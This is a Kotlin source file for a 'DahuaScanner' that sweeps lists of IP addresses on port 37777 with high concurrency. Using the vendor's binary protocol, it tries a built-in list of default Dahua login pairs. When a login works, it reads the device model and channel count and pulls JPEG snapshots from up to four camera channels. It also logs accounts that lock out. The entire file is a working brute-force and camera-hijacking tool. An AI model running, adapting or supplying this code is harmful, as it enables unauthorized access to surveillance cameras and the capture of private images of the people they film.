package com.dahua.checker

import kotlinx.coroutines.*
import kotlinx.coroutines.sync.Semaphore
import kotlinx.coroutines.sync.withPermit
import java.io.ByteArrayOutputStream
import java.io.InputStream
import java.io.OutputStream
import java.net.InetSocketAddress
import java.net.Socket
import java.util.concurrent.atomic.AtomicInteger

data class ScanResult(
    val ip: String,
    val port: Int,
    val login: String,
    val password: String,
    val model: String,
    val channels: Int,
    val snapshot: ByteArray?,
    val blocked: Boolean = false,
    val timestampMs: Long = System.currentTimeMillis()
)

data class ScanProgress(
    val total: Int,
    val checked: Int,
    val successful: Int,
    val blocked: Int,
    val elapsedMs: Long,
    val finished: Boolean = false,
    val cancelled: Boolean = false
)

class DahuaScanner {

    companion object {
        const val DEFAULT_PORT = 37777
        const val TIMEOUT_CONNECT = 1500
        const val TIMEOUT_READ = 3000
        const val TIMEOUT_SNAPSHOT = 2500
        const val MAX_CONCURRENT = 200

        val CREDENTIALS = listOf(
            "admin" to "admin",
            "admin" to "123456",
            "666666" to "666666",
            "888888" to "888888",
            "default" to "tluafed",
            "admin" to "admin123",
            "user" to "user",
            "admin" to ""
        )
    }

    @Volatile
    var cancelled = false

    private val semaphore = Semaphore(MAX_CONCURRENT)
    private val checkedCount = AtomicInteger(0)
    private val successCount = AtomicInteger(0)
    private val blockedCount = AtomicInteger(0)

    suspend fun scan(
        ips: List<String>,
        port: Int = DEFAULT_PORT,
        onResult: suspend (ScanResult) -> Unit,
        onProgress: suspend (ScanProgress) -> Unit
    ) {
        cancelled = false
        checkedCount.set(0)
        successCount.set(0)
        blockedCount.set(0)
        val total = ips.size
        val startTime = System.currentTimeMillis()

        // Периодический прогресс каждые 200мс
        val progressJob = CoroutineScope(Dispatchers.Default).launch {
            while (isActive && !cancelled && checkedCount.get() < total) {
                delay(200)
                val elapsed = System.currentTimeMillis() - startTime
                onProgress(ScanProgress(total, checkedCount.get(), successCount.get(), blockedCount.get(), elapsed))
            }
        }

        // Все IP запускаются сразу, семафор ограничивает параллелизм
        coroutineScope {
            ips.map { ip ->
                async(Dispatchers.IO) {
                    if (cancelled) {
                        checkedCount.incrementAndGet()
                        return@async
                    }
                    semaphore.withPermit {
                        if (cancelled) {
                            checkedCount.incrementAndGet()
                            return@withPermit
                        }
                        try {
                            val result = tryCredentials(ip, port)
                            if (result != null) {
                                if (result.blocked) {
                                    blockedCount.incrementAndGet()
                                } else {
                                    successCount.incrementAndGet()
                                }
                                onResult(result)
                            }
                        } catch (_: Exception) {}
                        checkedCount.incrementAndGet()
                    }
                }
            }.awaitAll()
        }

        progressJob.cancel()

        val elapsed = System.currentTimeMillis() - startTime
        onProgress(
            ScanProgress(
                total, checkedCount.get(), successCount.get(), blockedCount.get(), elapsed,
                finished = !cancelled,
                cancelled = cancelled
            )
        )
    }

    private fun tryCredentials(ip: String, port: Int): ScanResult? {
        // Сначала быстрая проверка порта
        try {
            Socket().use { probe ->
                probe.connect(InetSocketAddress(ip, port), TIMEOUT_CONNECT)
            }
        } catch (_: Exception) {
            return null // порт закрыт — пропускаем все логины
        }

        for ((login, password) in CREDENTIALS) {
            if (cancelled) return null
            var socket: Socket? = null
            try {
                socket = Socket()
                socket.tcpNoDelay = true
                socket.setSoLinger(true, 0)
                socket.connect(InetSocketAddress(ip, port), TIMEOUT_CONNECT)
                socket.soTimeout = TIMEOUT_READ

                val output = socket.getOutputStream()
                val input = socket.getInputStream()

                val authStatus = sendLogin(output, input, login, password)

                if (authStatus == AuthStatus.BLOCKED) {
                    socket.close()
                    return ScanResult(ip, port, login, password, "", 0, null, blocked = true)
                }

                if (authStatus != AuthStatus.SUCCESS) {
                    socket.close()
                    continue
                }

                val model = try {
                    getModel(output, input)
                } catch (_: Exception) {
                    "unknown"
                }

                val channels = try {
                    getChannelsCount(output, input)
                } catch (_: Exception) {
                    1
                }

                for (ch in 0 until minOf(channels, 4)) {
                    try {
                        socket.soTimeout = TIMEOUT_SNAPSHOT
                        val photo = getSnapshot(output, input, ch)
                        socket.soTimeout = TIMEOUT_READ
                        if (photo != null && photo.size > 100) {
                            try { socket.close() } catch (_: Exception) {}
                            return ScanResult(ip, port, login, password, model, channels, photo)
                        }
                    } catch (_: Exception) {}
                }

                try { socket.close() } catch (_: Exception) {}
                return ScanResult(ip, port, login, password, model, channels, null)

            } catch (_: Exception) {
                try { socket?.close() } catch (_: Exception) {}
                // Если первый логин не коннектится — порт точно закрыт
                if (login == CREDENTIALS.first().first && password == CREDENTIALS.first().second) {
                    return null
                }
                continue
            }
        }
        return null
    }

    private enum class AuthStatus { SUCCESS, BLOCKED, FAIL }

    private fun sendLogin(output: OutputStream, input: InputStream, login: String, password: String): AuthStatus {
        val loginAscii = login.toByteArray(Charsets.US_ASCII)
        val passAscii = password.toByteArray(Charsets.US_ASCII)

        val loginPadded = ByteArray(8)
        loginAscii.copyInto(loginPadded, 0, 0, minOf(loginAscii.size, 8))
        val passPadded = ByteArray(8)
        passAscii.copyInto(passPadded, 0, 0, minOf(passAscii.size, 8))

        val totalLen = 24 + loginAscii.size + passAscii.size
        if (totalLen > 127) return AuthStatus.FAIL

        val timestamp = (System.currentTimeMillis() / 1000).toString().toByteArray(Charsets.US_ASCII)

        val packet = ByteArrayOutputStream(64)
        packet.write(byteArrayOf(0xa0.toByte(), 0x00, 0x00, 0x60))
        packet.write(byteArrayOf(totalLen.toByte()))
        packet.write(byteArrayOf(0x00, 0x00, 0x00))
        packet.write(loginPadded)
        packet.write(passPadded)
        packet.write(byteArrayOf(0x04, 0x01, 0x00, 0x00, 0x00, 0x00, 0xa1.toByte(), 0xaa.toByte()))
        packet.write(loginAscii)
        packet.write("&&".toByteArray(Charsets.US_ASCII))
        packet.write(passAscii)
        packet.write(byteArrayOf(0x00))
        packet.write("Random:".toByteArray(Charsets.US_ASCII))
        packet.write(timestamp)
        packet.write("\r\n\r\n".toByteArray(Charsets.US_ASCII))

        output.write(packet.toByteArray())
        output.flush()

        val response = ByteArray(128)
        var totalRead = 0
        val deadline = System.currentTimeMillis() + TIMEOUT_READ
        while (totalRead < 10 && System.currentTimeMillis() < deadline) {
            val r = input.read(response, totalRead, 128 - totalRead)
            if (r == -1) return AuthStatus.FAIL
            totalRead += r
        }
        if (totalRead < 10) return AuthStatus.FAIL

        if (response[8].toInt() == 0) return AuthStatus.SUCCESS
        if (response[8].toInt() == 1 && response[9].toInt() == 4) return AuthStatus.BLOCKED
        return AuthStatus.FAIL
    }

    private fun getModel(output: OutputStream, input: InputStream): String {
        val cmd = ByteArray(32)
        cmd[0] = 0xa4.toByte()
        cmd[8] = 0x0b
        output.write(cmd)
        output.flush()

        val data = receiveMsg(input)
        val zeroIdx = data.indexOf(0x00)
        return if (zeroIdx > 0) {
            String(data, 0, zeroIdx, Charsets.US_ASCII)
        } else if (data.isNotEmpty()) {
            String(data, Charsets.US_ASCII).trim()
        } else {
            "unknown"
        }
    }

    private fun getChannelsCount(output: OutputStream, input: InputStream): Int {
        val cmd = ByteArray(32)
        cmd[0] = 0xa8.toByte()
        cmd[8] = 0x01
        output.write(cmd)
        output.flush()

        val data = receiveMsg(input)
        val dataStr = String(data, Charsets.US_ASCII)
        return "&&".toRegex().findAll(dataStr).count() + 1
    }

    private fun receiveMsg(input: InputStream): ByteArray {
        val header = readExact(input, 32) ?: return ByteArray(0)
        val length = ((header[5].toInt() and 0xFF) shl 8) or (header[4].toInt() and 0xFF)
        if (length <= 0 || length > 65535) return ByteArray(0)
        return readExact(input, length) ?: ByteArray(0)
    }

    private fun getSnapshot(output: OutputStream, input: InputStream, channelId: Int): ByteArray? {
        val chByte = channelId.toByte()

        val cmd = byteArrayOf(
            0x11, 0x00, 0x00, 0x00, 0x28, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00,
            chByte, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, chByte, 0x00, 0x00, 0x00,
            0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
        )

        output.write(cmd)
        output.flush()

        val buffer = ByteArrayOutputStream()
        val chunk = ByteArray(8192)
        val deadline = System.currentTimeMillis() + TIMEOUT_SNAPSHOT
        var firstChunk = true

        while (System.currentTimeMillis() < deadline) {
            try {
                val r = input.read(chunk)
                if (r == -1) break
                if (firstChunk) {
                    if (r > 32) {
                        buffer.write(chunk, 32, r - 32)
                    }
                    firstChunk = false
                } else {
                    buffer.write(chunk, 0, r)
                }
                val data = buffer.toByteArray()
                if (findMarker(data, 0xFF.toByte(), 0xD9.toByte()) != -1) break
            } catch (_: java.net.SocketTimeoutException) {
                break
            }
        }

        var data = buffer.toByteArray()
        data = cleanGarbage(data, channelId.toByte())

        val startIdx = findMarker(data, 0xFF.toByte(), 0xD8.toByte())
        val endIdx = findMarker(data, 0xFF.toByte(), 0xD9.toByte())

        if (startIdx != -1 && endIdx != -1 && startIdx < endIdx) {
            val jpeg = data.copyOfRange(startIdx, endIdx + 2)
            return if (jpeg.size > 100) jpeg else null
        }
        return null
    }

    private fun cleanGarbage(data: ByteArray, chByte: Byte): ByteArray {
        val garbage1 = byteArrayOf(0x0a, chByte, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00)
        val garbage2 = byteArrayOf(0xbc.toByte(), 0x00, 0x00, 0x00, 0x00, 0x80.toByte(), 0x00, 0x00, chByte)

        var result = data

        var changed = true
        while (changed) {
            changed = false
            val pos = findPattern(result, garbage1)
            if (pos != -1) {
                val tStart = maxOf(0, pos - 24)
                val tEnd = pos + garbage1.size
                result = removeRange(result, tStart, tEnd)
                changed = true
            }
        }

        changed = true
        while (changed) {
            changed = false
            val pos = findPattern(result, garbage2)
            if (pos != -1) {
                val tEnd = minOf(pos + 32, result.size)
                result = removeRange(result, pos, tEnd)
                changed = true
            }
        }

        return result
    }

    private fun removeRange(data: ByteArray, from: Int, to: Int): ByteArray {
        val out = ByteArray(data.size - (to - from))
        data.copyInto(out, 0, 0, from)
        data.copyInto(out, from, to, data.size)
        return out
    }

    private fun findPattern(data: ByteArray, pattern: ByteArray): Int {
        for (i in 0..data.size - pattern.size) {
            var match = true
            for (j in pattern.indices) {
                if (data[i + j] != pattern[j]) {
                    match = false
                    break
                }
            }
            if (match) return i
        }
        return -1
    }

    private fun findMarker(data: ByteArray, b1: Byte, b2: Byte): Int {
        for (i in 0 until data.size - 1) {
            if (data[i] == b1 && data[i + 1] == b2) return i
        }
        return -1
    }

    private fun readExact(input: InputStream, size: Int): ByteArray? {
        val buf = ByteArray(size)
        var off = 0
        while (off < size) {
            val r = input.read(buf, off, size - off)
            if (r == -1) return if (off > 0) buf.copyOf(off) else null
            off += r
        }
        return buf
    }
}
